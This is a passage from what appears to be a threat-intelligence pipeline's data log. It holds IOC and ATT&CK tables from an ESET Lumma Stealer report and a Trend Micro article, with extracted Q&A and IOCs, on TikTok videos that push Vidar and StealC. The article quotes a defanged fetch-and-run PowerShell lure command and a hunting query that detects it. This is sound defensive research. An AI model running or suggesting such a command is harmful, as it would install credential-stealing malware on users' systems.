Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]0\nbigmouthudiop[.]shop\nfroytnewqowv[.]shop\nlocatedblsoqp[.]shop\nstagedchheiqwo[.]shop\nCloudflare, Inc.\n2024‑07‑16\nLumma Stealer C&amp;C server.\n\n\n104.21.19[.]156\ncallosallsaospz[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.153[.]40\nindexterityszcoxp[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.192[.]52\nlariatedzugspd[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.213[.]85\nliernessfornicsa[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.137[.]78\noutpointsozp[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.221[.]214\nshepherdlyopzc[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.204[.]158\nunseaffarignsk[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.178[.]194\nupknittsoappz[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]3\nbassizcellskz[.]shop\nbyteplusx[.]digital\nsparkiob[.]digital\nlongitudde[.]digital\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n104.21.47[.]141\ncelebratioopz[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n172.67.158[.]159\ncomplaintsipzzx[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n172.67.204[.]20\ndeallerospfosu[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n104.21.35[.]48\nlanguagedscie[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n104.21.73[.]43\nmennyudosirso[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]9\nquialitsuzoxm[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n172.67.166[.]231\nwriterospzm[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n104.21.16[.]180\ncaffegclasiqwp[.]shop\nCloudflare, Inc.\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\n172.67.146[.]35\ncondedqpwqm[.]shop\nCloudflare, Inc.\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\nN/A\nevoliutwoqm[.]shop\nN/A\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\n188.114.96[.]0\nmillyscroqwp[.]shop\nstamppreewntnq[.]shop\nadvennture[.]top\nCloudflare, Inc.\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\n104.21.67[.]155\ntraineiwnqo[.]shop\nCloudflare, Inc.\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\n94.140.14[.]33\nachievenmtynwjq[.]shop\ncarrtychaintnyw[.]shop\nchickerkuso[.]shop\nmetallygaricwo[.]shop\nmilldymarskwom[.]shop\nopponnentduei[.]shop\npuredoffustow[.]shop\nquotamkdsdqo[.]shop\nbemuzzeki[.]sbs\nexemplarou[.]sbs\nexilepolsiy[.]sbs\nfrizzettei[.]sbs\ninvinjurhey[.]sbs\nisoplethui[.]sbs\nladdyirekyi[.]sbs\nwickedneatr[.]sbs\nCloudflare, Inc.\n2024‑09‑21\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]4\nusseorganizedw[.]shop\nbellflamre[.]click\ntripfflux[.]world\nCloudflare, Inc.\n2024‑09‑24\nLumma Stealer C&amp;C server.\n\n\n104.21.44[.]84\nbeerishint[.]sbs\nCloudflare, Inc.\n2024‑10‑06\nLumma Stealer C&amp;C server.\n\n\n104.21.64[.]84\n1212tank.activitydmy[.]icu\nCloudflare, Inc.\n2024‑11‑12\nLumma Stealer C&amp;C server.\n\n\n104.21.93[.]246\nbrownieyuz[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.189[.]210\nducksringjk[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.146[.]64\nexplainvees[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n104.21.90[.]226\nrelalingj[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n104.21.14[.]17\nrepostebhu[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.192[.]43\nrottieud[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]1\nthinkyyokej[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]7\nbashfulacid[.]lat\ntentabatte[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n104.21.86[.]54\ncurverpluch[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n104.21.66[.]86\nlev‑tolstoi[.]com\nCloudflare, Inc.\n2024‑12‑17\nLumma Stealer C&amp;C server.\n\n\n172.64.80[.]1\nmanyrestro[.]lat\ntoppyneedus[.]biz\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]2\nshapestickyr[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n172.67.192[.]247\nslipperyloo[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n104.105.90[.]131\nsteamcommunity[.]com\nsteamcommunity[.]com\nAkamai Technologies, Inc.\n2024‑06‑27\nSteam profile dead‑drop resolvers.\n\n\n172.67.146[.]68\ntalkynicer[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n172.67.184[.]241\nwordyfindy[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\nN/A\nbeevasyeip[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\nbroadecatez[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\nencirelk[.]cyou\nN/A\n2025‑01‑28\nLumma Stealer C&amp;C server.\n\n\nN/A\ngranystearr[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\nquarrelepek[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\nrockemineu[.]bond\nN/A\n2025‑01‑28\nLumma Stealer C&amp;C server.\n\n\n104.21.19[.]91\nsuggestyuoz[.]biz\nCloudflare, Inc.\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\ntranuqlekper[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\n104.21.69[.]194\ncodxefusion[.]top\nCloudflare, Inc.\n2025‑02‑28\nLumma Stealer C&amp;C server.\n\n\n104.21.80[.]1\nearthsymphzony[.]today\nclimatologfy[.]top\nCloudflare, Inc.\n2025‑02‑26\nLumma Stealer C&amp;C server.\n\n\n104.21.88[.]16\nexperimentalideas[.]today\nCloudflare, Inc.\n2025‑03‑01\nLumma Stealer C&amp;C server.\n\n\n172.67.146[.]181\ngadgethgfub[.]icu\nCloudflare, Inc.\n2025‑03‑01\nLumma Stealer C&amp;C server.\n\n\n104.21.48[.]238\nhardrwarehaven[.]run\nCloudflare, Inc.\n2025‑02‑28\nLumma Stealer C&amp;C server.\n\n\n104.21.16[.]1\nhardswarehub[.]today\npixtreev[.]run\nCloudflare, Inc.\n2025‑02‑28\nLumma Stealer C&amp;C server.\n\n\n104.21.39[.]95\nquietswtreams[.]life\nCloudflare, Inc.\n2025‑02‑26\nLumma Stealer C&amp;C server.\n\n\n172.67.222[.]46\nsocialsscesforum[.]icu\nCloudflare, Inc.\n2025‑03‑03\nLumma Stealer C&amp;C server.\n\n\n172.67.191[.]187\ntechmindzs[.]live\nCloudflare, Inc.\n2025‑03‑01\nLumma Stealer C&amp;C server.\n\n\n172.67.214[.]226\ntechspherxe[.]top\nCloudflare, Inc.\n2025‑03‑01\nLumma Stealer C&amp;C server.\n\n\n104.21.26[.]124\nappgridn[.]live\nCloudflare, Inc.\n2025‑03‑24\nLumma Stealer C&amp;C server.\n\n\n172.67.178[.]7\nlunoxorn[.]top\nCloudflare, Inc.\n2025‑03‑31\nLumma Stealer C&amp;C server.\n\n\n104.21.47[.]117\nskynetxc[.]live\nCloudflare, Inc.\n2025‑03‑24\nLumma Stealer C&amp;C server.\n\n\n104.21.72[.]121\ntargett[.]top\nCloudflare, Inc.\n2025‑03‑20\nLumma Stealer C&amp;C server.\n\n\n188.114.96[.]2\ntravewlio[.]shop\nCloudflare, Inc.\n2025‑03‑20\nLumma Stealer C&amp;C server.\n\n\n104.21.42[.]7\nchangeaie[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n104.21.85[.]126\nclarmodq[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.161[.]40\nliftally[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.176[.]107\npiratetwrath[.]run\nCloudflare, Inc.\n2025‑04‑17\nLumma Stealer C&amp;C server.\n\n\n172.67.215[.]114\nquilltayle[.]live\nCloudflare, Inc.\n2025‑04‑17\nLumma Stealer C&amp;C server.\n\n\n172.67.143[.]12\nsalaccgfa[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n104.21.5[.]146\nstarofliught[.]top\nCloudflare, Inc.\n2025‑04‑17\nLumma Stealer C&amp;C server.\n\n\n104.21.32[.]1\nzestmodp[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.147[.]123\nequatorf[.]run\nCloudflare, Inc.\n2025‑04‑21\nLumma Stealer C&amp;C server.\n\n\n104.21.112[.]1\nhemispherexz[.]top\nCloudflare, Inc.\n2025‑04‑21\nLumma Stealer C&amp;C server.\n\n\n104.21.20[.]106\nlatitudert[.]live\nCloudflare, Inc.\n2025‑04‑21\nLumma Stealer C&amp;C server.\n\n\n172.67.216[.]12\nsectorecoo[.]live\nCloudflare, Inc.\n2025‑04‑19\nLumma Stealer C&amp;C server.\n\n## MITRE ATT&amp;CK techniques\n\nThis table was built using version 17 of the MITRE ATT&amp;CK framework.\n\nTactic\nID\nName\nDescription\n\n\n\n\nResource Development\nT1587.001\nDevelop Capabilities: Malware\nLumma Stealer operators actively developed their malware as a product for their service.\n\n\nT1583.001\nAcquire Infrastructure: Domains\nLumma Stealer operators registered domains for their exfiltration infrastructure.\n\n\nT1583.006\nAcquire Infrastructure: Web Services\nLumma Stealer operators used Cloudflare services to hide their infrastructure. Lumma Stealer also hid its C&amp;C URLs in public services like dummy Steam profiles or empty Telegram channels.\n\n\nExecution\nT1059.003\nCommand-Line Interface: Windows Command Shell\nLumma Stealer executes cmd.exe to delete temporary files.\n\n\nT1106\nNative API\nLumma Stealer executes a variety of Windows APIs, including VirtualAlloc, LoadLibraryA, and GetProcAddress.\n\n\nT1204.001\nUser Execution: Malicious Link\nLumma Stealer operators offer a simple LNK packing feature for their malware builds.\n\n\nT1047\nWindows Management Instrumentation\nLumma Stealer uses WMI queries to gather system information.\n\n\nDefense Evasion\nT1622\nDebugger Evasion\nLumma Stealer checks for debugger presence.\n\n\nT1140\nDeobfuscate/Decode Files or Information\nLumma Stealer uses ChaCha20 for C&amp;C list and dynamic config encryption.\n\n\nT1027.007\nObfuscated Files or Information: Dynamic API Resolution\nLumma Stealer resolves API names at runtime using the FNV-1a hash algorithm.\n\n\nT1027.013\nObfuscated Files or Information: Encrypted/Encoded File\nLumma Stealer encrypts strings and important binary data using stack strings or ChaCha20.\n\n\nCredential Access\nT1555.003\nCredentials from Password Stores: Credentials from Web Browsers\nLumma Stealer gathers credentials from multiple browsers.\n\n\nT1539\nSteal Web Session Cookie\nLumma Stealer gathers cookies from multiple browsers.\n\n\nDiscovery\nT1217\nBrowser Bookmark Discovery\nLumma Stealer checks and collects various information about installed browsers on victims’ machines.\n\n\nT1012\nQuery Registry\nLumma Stealer queries registry keys to list installed software on victims’ machines.\n\n\nT1057\nProcess Discovery\nLumma Stealer sends the process list to its C&amp;C server.\n\n\nT1518\nSoftware Discovery\nLumma Stealer sends a list of installed software to its C&amp;C server.\n\n\nT1082\nSystem Information Discovery\nLumma Stealer sends system information to its C&amp;C server.\n\n\nT1124\nSystem Time Discovery\nLumma Stealer sends the current system time and time zone to its C&amp;C server.\n\n\nCollection\nT1560\nArchive Collected Data\nLumma Stealer compresses gathered data before exfiltration to its C&amp;C server.\n\n\nT1119\nAutomated Collection\nLumma Stealer's exfiltration capabilities are fully automated and based on a configuration file.\n\n\nT1113\nScreen Capture\nLumma Stealer takes screenshots of victims’ machines based on dynamic configuration.\n\n\nT1005\nData from Local System\nLumma Stealer collects local system data from victims’ machines.\n\n\nCommand and Control\nT1071.001\nApplication Layer Protocol: Web Protocols\nLumma Stealer uses HTTPS communication with its C&amp;C servers.\n\n\nT1132.001\nData Encoding: Standard Encoding\nLumma Stealer used base64 encoding for obtaining its configuration from the C&amp;C server.\n\n\nT1573.001\nEncrypted Channel: Symmetric Cryptography\nLumma Stealer uses additional ChaCha20 encryption under the HTTPS network protocol.\n\n\nT1008\nFallback Channels\nLumma Stealer employs backup dead-drop resolvers in Steam profiles and Telegram channels.\n\n\nT1102.001\nWeb Service: Dead Drop Resolver\nLumma Stealer employs backup dead-drop resolvers in Steam profiles and Telegram channels.\n\n\nExfiltration\nT1020\nAutomated Exfiltration\nLumma Stealer exfiltrates stolen credentials and data over the C&amp;C channel.\n\n\nT1041\nExfiltration Over C2 Channel\nLumma Stealer exfiltrates stolen credentials and data over the C&amp;C channel.\n\n## Let us keep you \nup to date\n\nSign up for our newsletters\n\n#### Related Articles\n\nESET Research\n\nDanabot: Analyzing a fallen empire\n\nESET Research\n\nDanabot: Analyzing a fallen empire\n\nESET Research\n\nThreat Reports\n\nESET APT Activity Report Q4 2024–Q1 2025\n\nESET Research\n\nThreat Reports\n\nESET APT Activity Report Q4 2024–Q1 2025\n\nESET Research\n\nOperation RoundPress\n\nESET Research\n\nOperation RoundPress\n\n## Table of Contents\n\n### Similar Articles\n\nESET research\n\nESET takes part in global operation to disrupt Trickbot\n\nESET research\n\nESET takes part in global operation to disrupt Zloader botnets\n\nESET research\n\nESET takes part in global operation to disrupt the Grandoreiro banking trojan\n\n### Share Article\n\n### Discussion\n\nAward-winning news, views, and insight from the ESET security community\n\nCopyright © ESET, All Rights Reserved"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.trendmicro.com/en_us/research/25/e/tiktok-videos-infostealers.html", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware involved is Vidar and StealC, which are information stealers.", "question": "What kind of malware is it?"}, {"answer": "It involves a social engineering attack, specifically using TikTok videos to lure victims into downloading information stealers, such as Vidar and StealC malware, by executing malicious PowerShell commands.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The Vidar and StealC malware steal sensitive information, including credentials, but the text does not specifically mention credit cards or bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The campaign delivers Vidar and StealC infostealers, which can steal sensitive information, including credentials and potentially wallet data.", "question": "Is it related to wallet stealer?"}, {"answer": "The Vidar and StealC malware steal sensitive information, including credentials and data that can be used for exfiltration, with potential compromise of sensitive systems.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is forwarded to the command-and-control (C&C) servers, including hxxps://steamcommunity[.]com/profiles/76561199846773220 (Vidar), hxxps://t[.]me/v00rd (Vidar), and hxxp://91[.]92[.]46[.]70/1032c730725d1721[.]php (StealC).", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.trendmicro.com/en_us/research/25/e/tiktok-videos-infostealers.html", "error": null, "summary": "Here is a concise 4-5 sentence summary of the article:\n\nA new social engineering campaign on TikTok uses AI-generated videos to lure victims into downloading Vidar and StealC information stealers by executing malicious PowerShell commands disguised as software activation steps. The campaign targets TikTok users, potentially affecting both individuals and businesses, and can lead to data exfiltration, credential theft, and compromise of sensitive systems. The attackers use TikTok's algorithmic reach to spread the malware, with some videos reaching over half a million views, and employ techniques such as hiding malicious code and using legitimate services like Steam and Telegram to conceal command-and-control server information. The potential impact of this threat is significant, as it can compromise user systems and steal sensitive information, highlighting the need for reinforced security awareness and monitoring for unusual command execution. To mitigate this threat, users and businesses can utilize security solutions like Trend Vision One, which detects and blocks the indicators of compromise (IOCs) associated with this campaign.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "hxxp://91[.]92[.]46[.]70/1032c730725d1721[.]php"}, {"type": "Domain or URL", "value": "hxxps://allaivo[.]me/spotify"}, {"type": "Domain or URL", "value": "hxxps://amssh[.]co/file[.]exe"}, {"type": "Domain or URL", "value": "hxxps://amssh[.]co/script[.]ps1"}, {"type": "Domain or URL", "value": "hxxps://steamcommunity[.]com/profiles/76561199846773220"}, {"type": "Domain or URL", "value": "hxxps://t[.]me/v00rd"}, {"type": "IP Address", "value": "49.12.113.201"}, {"type": "IP Address", "value": "116.202.6.216"}, {"type": "IP Address", "value": "91.92.46.70"}, {"type": "SHA256 Hash", "value": "3bb81c977bb34fadb3bdeac7e61193dd009725783fb2cf453e15ced70fc39e9b"}, {"type": "SHA256 Hash", "value": "afc72f0d8f24657d0090566ebda910a3be89d4bdd68b029a99a19d146d63adc5"}, {"type": "SHA256 Hash", "value": "b8d9821a478f1a377095867aeb2038c464cc59ed31a4c7413ff768f2e14d3886"}], "mitre_ttps": null, "keywords_found": ["analysis", "infostealers", "phishing", "intelligence", "malicious", "threat", "apt"], "article_textual_content": "# TikTok Videos Promise Pirated Apps, Deliver Vidar and StealC Infostealers Instead\n\nTrend™ Research uncovered a campaign on TikTok that uses videos to lure victims into downloading information stealers, a tactic that can be automated using AI tools.\n\nBy: Junestherry Dela Cruz\n\t\t\n\t\t\n\t\t\tMay 21, 2025\nRead time:  ( words)\n\nSave to Folio\n\nSummary:\n\n- Trend Research uncovered a new social engineering campaign using TikTok to deliver the Vidar and StealC information stealers. This attack uses videos (possibly AI-generated) to instruct users to execute PowerShell commands, which are disguised as software activation steps.\n- TikTok’s algorithmic reach increases the likelihood of widespread exposure, with one video reaching more than half a million views. Businesses can be affected by data exfiltration, credential theft, and potential compromise of sensitive systems as a result of this threat.\n- Reinforcing security awareness, especially against AI-generated content, is crucial. Monitoring for unusual command execution involving PowerShell or other system utilities also helps identify malicious activity early.\n- Trend Vision One™ detects and blocks the IOCs discussed in this blog. Trend Vision One customers can also access hunting queries, threat insights, and threat intelligence reports to gain rich context and the latest updates on this campaign.\n\nTrend Research has uncovered a novel social engineering campaign using TikTok’s vast user base to distribute information-stealing malware, specifically Vidar and StealC. Unlike the prevalent Fake CAPTCHA campaign — which relies on fake CAPTCHA pages and clipboard hijacking to trick users into running malicious scripts — this new campaign pivots to exploiting the popularity and viral nature of TikTok.\n\nThreat actors are now using TikTok videos that are potentially generated using AI-powered tools to socially engineer users into executing PowerShell commands under the guise of guiding them to activate legitimate software or unlock premium features. This campaign highlights how attackers are ready to weaponize whichever social media platforms are currently popular to distribute malware.\n\nThis report details the observed tactics, techniques, and procedures (TTPs), indicators of compromise (IoCs), and the potential impact of this trend.\n\nGoing where the users are: social media-driven deception\n\nThreat actors have long used social media platforms for their attacks, and TikTok is no different. Previous campaigns used websites where malicious activity could be identified through the presence of injected JavaScript on compromised landing pages; this TikTok-based campaign used social engineering entirely within video content.\n\nThe vast user base and algorithmic reach of social media platforms provide an ideal delivery mechanism for threat actors. For attackers, this means broad distribution without the logistical burden of maintaining an infrastructure. The use of AI-generated content also elevates these kinds of attacks from isolated incidents to a highly scalable operation, as these videos can be rapidly produced and tailored to target different user segments.\n\nThe use of PowerShell from a technical utility to a social engineering tool is also notable. In this campaign, attackers are using TikTok videos to verbally instruct users into executing malicious commands on their own systems. The social engineering occurs within the video itself, rather than through detectable code or scripts. There is no malicious code present on the platform for security solutions to analyze or block. All actionable content is delivered visually and aurally. Threat actors do this to attempt to evade existing detection mechanisms, making it harder for defenders to detect and disrupt these campaigns.\n\nInitial vector\n\nWe initially identified a TikTok user, @gitallowed, who posted multiple faceless, potentially AI-generated videos. Since then, we have uncovered additional accounts engaging in similar activity, including @zane.houghton, @allaivo2, @sysglow.wow, @alexfixpc, and @digitaldreams771. These accounts are no longer active.\n\nThe videos instruct viewers to run a sequence of commands to purportedly activate legitimate software, such as Windows OS, Microsoft Office, CapCut, and Spotify. The videos are highly similar, with only minor differences in camera angles and the download URLs used by PowerShell to fetch the payload. These suggest that the videos were likely created through automation. The instructional voice also appears AI-generated, reinforcing the likelihood that AI tools are being used to produce these videos.\n\nTo better illustrate the scope and presentation of this campaign, Figure 1 shows the profile page of the TikTok account used by the threat actor:\n\nFigure 1. The profile page of a TikTok user account that posts videos on how to activate software that culminates in the execution of a PowerShell command\n\nOne particular video, which instructs viewers to run a PowerShell command, has attracted over 20,000 likes and more than 100 comments — clear indicators of high user interaction and trust. While the exact view count is not visible in the screenshot, TikTok’s analytics reveal that this video has reached nearly 500,000 views. Figure 2 captures the video’s popularity and engagement metrics. The significant engagement with this video highlights its reach and the likelihood that many viewers might have followed the instructions.\n\nFigure 2: Screenshots showing the widespread exposure and potential impact of the campaign\n\nIn the video, the threat actor presents a series of simple, step-by-step instructions, making the malicious process appear both legitimate and easy to follow:\n\n1. Press  Windows + R\n2. Type powershell and press Enter\n3. Execute the following command:\n\niex (irm hxxps://allaivo[.]me/spotify)\n\nThese instructions are designed to socially engineer viewers into running a PowerShell command that downloads and executes a remote script, ultimately compromising their system.\n\nFigure 3. A snippet of the malicious PowerShell script\n\nMalicious chain of execution\n\nThe PowerShell command downloads and executes a script (SHA256: b8d9821a478f1a377095867aeb2038c464cc59ed31a4c7413ff768f2e14d3886) from hxxps://allaivo[.]me/spotify.\n\nThe attack chain involves the following:\n\n1. Upon execution, the script first creates hidden directories within the user’s APPDATA and LOCALAPPDATA folders, adding these locations to the Windows Defender exclusion list to evade detection.\n2. It then retrieves a secondary payload from hxxps://amssh[.]co/file.exe, which has been identified as either Vidar or StealC malware, and saves it in the hidden folder.\n3. The script employs the retry logic to ensure that the payload is downloaded successfully, and then launches the malware executable as a hidden, elevated process.\n4. If the previous process completes successfully, the script downloads an additional PowerShell script from hxxps://amssh[.]co/script[.]ps1, saves it in the hidden directory, and sets up persistence by creating a registry key to execute the script at startup.\n5. The script deletes temporary folders to minimize forensic traces, while robust error handling ensures the infection chain proceeds smoothly.\n\nCommand-and-control infrastructure\n\nThe downloaded Vidar and StealC malware will then reach out to their command-and-control (C&amp;C) servers:\n\n- hxxps://steamcommunity[.]com/profiles/76561199846773220 (Vidar)\n- hxxps://t[.]me/v00rd (Vidar)\n- hxxp://91[.]92[.]46[.]70/1032c730725d1721[.]php (StealC)\n\nVidar, in particular, abuses legitimate services like Steam and Telegram to serve as Dead Drop Resolvers (DDR)  for its C&amp;C server information to conceal them. The Steam profile below, for example, contains the actual C&amp;C IP address in its contents:\n\nFigure 4. Contents of Steam profile\n\nFigure 5 summarizes the infection chain of this campaign:\n\nFigure 5: The infection chain of the campaigns that lead to the Vidar and StealC malware\n\nSecurity implications for users and businesses\n\nThe shift to social media as a delivery mechanism for malware requires a corresponding reassessment in defense strategies. Traditional security controls that focus on malicious code detection, link scanning, and domain reputation are less effective against attacks that exploit user trust and obscure malicious intent. Security strategies must adopt a more holistic approach that includes social media monitoring, behavioral analysis, and targeted user education. Addressing these attack vectors proactively will reduce the risk of mass compromise and help users and businesses alike:\n\nExpanding threat monitoring to social media platforms: Integrating social media threat intelligence feeds can help businesses track emerging campaigns and identify high-engagement content linked to unusual or technical instructions. Since threat actors often reuse content across multiple platforms, correlating posts across social media networks can reveal interconnected campaigns and even emerging threats.\n\nIncorporating behavioral analysis: With no malicious code embedded, detecting malicious actions relies on monitoring user behavior. This includes identifying anomalous activities, such as the execution of system utilities like PowerShell. Red flags also include unexpected command execution, direct downloads from unknown URLs, unauthorized creation of folders, or modifications in security settings.\n\nStrengthening social engineering awareness: Employee training must evolve beyond phishing to address tactics that exploit visual and auditory content on social media. Users should be encouraged to scrutinize unsolicited technical instructions, verify the legitimacy of video sources, and report suspicious content, whether on social media, messaging apps, or email. After all, if an offer seems too good to be true, it probably is.\n\nProactive security with Trend Vision One™\n\nTrend Vision One™ is the only AI-powered enterprise cybersecurity platform that centralizes cyber risk exposure management, security operations, and robust layered protection. This comprehensive approach helps you predict and prevent threats, accelerating proactive security outcomes across your entire digital estate. Backed by decades of cybersecurity leadership and Trend Cybertron, the industry's first proactive cybersecurity AI, it delivers proven results: a 92% reduction in ransomware risk and a 99% reduction in detection time. Security leaders can benchmark their posture and showcase continuous improvement to stakeholders. With Trend Vision One, you’re enabled to eliminate security blind spots, focus on what matters most, and elevate security into a strategic partner for innovation.\n\nTrend Micro™ Threat Intelligence\n\nTo stay ahead of evolving threats, Trend customers can access Trend Vision One™ Threat Insights, which provides the latest insights from Trend Research on emerging threats and threat actors.\n\nTrend Vision One Threat Insights\n\n- Emerging Threats: Weaponizing TikTok – AI-Generated Videos Deliver Infostealers at Scale\n\nTrend Vision One Intelligence Reports (IOC Sweeping)\n\n- Emerging Social Engineering Campaigns Abusing TikTok for Malware Delivery (Vidar, StealC)\n\nHunting Queries\n\nTrend Vision One Search App\n\nTrend Vision One customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment.\n\nExecution of powershell command to download StealC/Vidar\n\neventSubId: 901 and objectRawDataStr:\"iex (irm https://\"\n\nMore hunting queries are available for Trend Vision One customers with Threat Insights Entitlement enabled.\n\nIndicators of Compromise (IOCs)\n\n- File Hash: 3bb81c977bb34fadb3bdeac7e61193dd009725783fb2cf453e15ced70fc39e9b\n- File Hash: afc72f0d8f24657d0090566ebda910a3be89d4bdd68b029a99a19d146d63adc5\n- File Hash: b8d9821a478f1a377095867aeb2038c464cc59ed31a4c7413ff768f2e14d3886\n- URL: hxxp://91[.]92[.]46[.]70/1032c730725d1721[.]php\n- URL: hxxps://allaivo[.]me/spotify\n- URL: hxxps://amssh[.]co/file[.]exe\n- URL: hxxps://amssh[.]co/script[.]ps1\n- URL: hxxps://steamcommunity[.]com/profiles/76561199846773220\n- URL: hxxps://t[.]me/v00rd\n- IP: hxxps://49[.]12[.]113[.]201\n- IP: hxxps://116[.]202[.]6[.]216\n\nTags\n\n### Authors\n\n- Junestherry Dela Cruz\nThreats Analyst\n\n### Related Articles\n\n- Earth Lamia Develops Custom Arsenal to Target Multiple Industries\n- Fake CAPTCHA Attacks Deploy Infostealers and RATs in a Multistage Payload Chain\n- A Cybersecurity Risk Assessment Guide for Leaders\n\n## Trend Vision One™ - Proactive Security Starts Here.\n\n### Resources\n\n- Blog\n- Newsroom\n- Threat Reports\n- Find a Partner\n\n### Support\n\n- Business Support Portal\n- Contact Us\n- Downloads\n- Free Trials\n\n### About Trend\n\n- About Us\n- Careers\n- Locations\n- Upcoming Events\n- Trust Center\n\n### Country Headquarters\n\n- Trend Micro - United States (US)\n- 225 East John Carpenter Freeway\n\n\t\t\t\n\t\t\t\tSuite 1500\n\n\t\t\t\n\t\t\tIrving, \n\t\t\tTexas 75062\n- Phone:: +1 (817) 569-8900\n\nSelect a country / region\n\n#### The Americas\n\n- United States\n- Brasil\n- Canada\n- México\n\n#### Middle East &amp; Africa\n\n- South Africa\n- Middle East and North Africa\n\n#### Europe\n\n- België (Belgium)\n- Česká Republika\n- Danmark\n- Deutschland, Österreich Schweiz\n- España\n- France\n- Ireland\n- Italia\n- Nederland\n- Norge (Norway)\n- Polska (Poland)\n- Suomi (Finland)\n- Sverige (Sweden)\n- Türkiye (Turkey)\n- United Kingdom\n\n#### Asia &amp; Pacific\n\n- Australia\n- Центральная Азия (Central Asia)\n- Hong Kong (English)\n- 香港 (中文) (Hong Kong)\n- भारत गणराज्य (India)\n- Indonesia\n- 日本 (Japan)\n- 대한민국 (South Korea)\n- Malaysia\n- Монголия (Mongolia) and рузия (Georgia)\n- New Zealand\n- Philippines\n- Singapore\n- 台灣 (Taiwan)\n- ประเทศไทย (Thailand)\n- Việt Nam\n\nExperience our enterprise cybersecurity platform for free\n\n- Claim your 30-day 